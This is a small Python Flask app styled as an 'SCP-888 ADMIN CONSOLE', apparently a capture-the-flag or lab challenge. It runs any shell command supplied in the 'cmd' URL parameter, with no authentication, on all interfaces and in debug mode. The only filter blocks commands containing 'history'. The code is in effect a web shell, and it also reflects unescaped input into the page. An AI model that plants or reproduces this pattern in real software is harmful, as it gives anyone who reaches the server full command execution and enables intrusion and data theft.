from flask import Flask, render_template
from flask import request
import subprocess
app = Flask(__name__)

basehtml = '''
<head>
    <title>SCP-888 ADMIN CONSOLE</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
<body>
<p margin-top=80%></p>
<h1 align="center" margin-top=20%>Hello, Admin. What command should I run?</h1>
<p align="center" margin-top=20%>{cmd}</p>
<p align="center" margin-top=20%>
<textarea rows="20" cols="80">{cmd_output}</textarea>
</p>
'''

@app.route("/")
def hello():
    try:
        cmd = request.args.get('cmd',)
        if "history" in cmd:
            cmd = "echo Not today samurai" 
        test = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        output = test.communicate()[0].decode('ascii')
        return basehtml.format(cmd_output=output, cmd=cmd)
    except:
        return basehtml.format(cmd_output="", cmd="NONE")

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')
